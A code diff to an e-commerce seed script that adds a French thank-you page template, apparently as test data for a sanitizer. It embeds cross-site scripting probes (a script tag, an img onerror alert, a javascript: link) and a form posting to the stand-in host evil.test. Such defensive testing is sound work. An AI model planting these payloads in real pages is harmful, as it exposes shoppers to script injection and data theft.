@@ -180,6 +180,12 @@ module.exports = async function seed(admin) {
     customFields: [],
     associateProductPath: 'products/cafe',
     layout: 'DEFAULT',
+    thankYouPage:
+      '<style>.ty{color:#222}</style><h1 class="ty">Merci {{customerFirstName}} !</h1>' +
+      '<p>{{productName}} × {{quantity}} : {{orderTotal}}, commande {{orderId}} ({{storeName}})</p>' +
+      '<a id="wa" href="{{whatsappUrl}}">WhatsApp</a> <a href="{{trackingUrl}}">Suivi</a> {{nope}}' +
+      '<script>window.hacked=1</script><img src="x.png" onerror="alert(1)">' +
+      '<a href="javascript:alert(1)">piège</a><form action="https://evil.test"><input name="p"></form>',
     countdown: { mode: 'loop', endsAt: new Date(Date.now() - 3600_000).toISOString(), cycleHours: 24, label: 'Plus que quelques heures' },
   })
   // Vendor B
